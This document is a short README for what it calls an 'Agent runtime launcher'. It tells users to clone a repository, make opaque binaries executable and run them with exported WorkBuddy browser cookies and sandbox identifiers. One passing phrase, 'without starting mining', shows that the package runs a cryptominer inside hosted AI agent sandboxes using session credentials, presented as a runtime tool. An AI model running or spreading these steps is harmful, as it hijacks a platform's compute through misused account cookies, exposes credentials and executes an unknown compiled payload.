# Agent runtime launcher

Linux amd64 binary delivery with runtime WorkBuddy browser credentials. Keep all four delivery files together.

| File | Purpose |
| --- | --- |
| start | Launcher |
| key | Package helper |
| data | Compiled program package |
| 1.key | Compatibility metadata; contains no account Cookie |

```sh
git clone https://github.com/sandrauzbmo/info_get.git
cd info_get
chmod +x start key
./start --key-file /secure/path/launch.key --cookie-file /secure/path/cookies.json
```

The launch key is supplied separately. Cookie input accepts a browser export array or a credential document containing `cookies`, `site`, `user_agent`, `account_id`, `task_id`, and `sandbox_id`. Browser domains select `workbuddy.ai` or `workbuddy.cn`; mixed domains or conflicting sites are rejected. The console prepares the document using the selected execution account and binds it to the current sandbox.

Use `--cookie-stdin` instead of `--cookie-file` to read the same JSON from standard input. The Cookie is passed to the final program through standard input, without a fixed account embedded in these files. Use restricted files and avoid putting credential values in shell arguments or logs. CLI OAuth token exports require their own authentication flow and are not browser Cookie exports.

`--check-only` validates the delivery and runtime input without starting mining. The session monitor attaches to the existing sandbox conversation; connection activity does not guarantee unlimited sandbox retention. Replace expired account credentials before the next launch.
